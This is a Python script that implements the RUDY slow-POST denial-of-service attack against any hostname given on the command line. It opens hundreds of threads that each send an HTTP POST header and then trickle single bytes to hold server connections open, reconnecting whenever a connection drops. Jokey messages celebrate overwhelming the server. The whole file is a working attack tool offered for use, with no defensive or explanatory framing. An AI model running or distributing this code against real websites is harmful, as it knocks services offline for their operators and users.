# Copyright Nicolas Pielawski 2016
import argparse, threading, socket, time, os

website_post_running = True
def website_post(host, port = 80, length = 1024, time_wait = 1, thread_mode = False):
    request = 'POST / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n'.format(host, length).encode('ascii')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
    except:
        print("LOL! The server cannot handle more connection... xD")
        return
    sock.send(request)

    for i in range(length):
        if not website_post_running and thread_mode:
            return
        try:
            sock.send(b' ')
        except:
            sock.close()
            website_post(host, port, length, time_wait)
        time.sleep(time_wait)

    sock.close()
    website_post(host, port, length, time_wait)

def rudy_attack(host, port = 80, length = 1024, time_wait = 1, thread_nbr = 512):
    global website_post_running
    website_post_running = True
    thread_pool = []
    for i in range(thread_nbr):
        thread_pool.append(threading.Thread(None, website_post, None, (host, port, length, time_wait, True)))
        thread_pool[i].start()
        print("{} threads started to attack {}:{}!\r".format(i+1, host, port), end="")
    print()
    print('Processing RUDY attack, now!')
    print('Press any key to stop the attack...')
    os.system('pause>nul')
    print("Closing...")
    website_post_running = False
    for thr in thread_pool:
        thr.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Processes the RUDY attack on an arbitrary target.',
                                     epilog='And that\'s how you burst a server with no zombies ;)')
    parser.add_argument('server', help='Hostname of the target to focus')
    parser.add_argument('-p', '--port', metavar='port', type=int, default=80, help='Port of the target to focus')
    parser.add_argument('-l', '--length', metavar='packet_len', type=int, default=1024, help='Length of the TCP Packet (without HTTP header)')
    parser.add_argument('-t', '--time', metavar='packet_time', default=1, help='Amount of time to wait between two TCP packets send.')
    parser.add_argument('-n', '--thread', metavar='count', default=512, help='Amount of clients that are going to contact the server.')
    args = parser.parse_args()

    rudy_attack(args.server, args.port, args.length, args.time, args.thread)
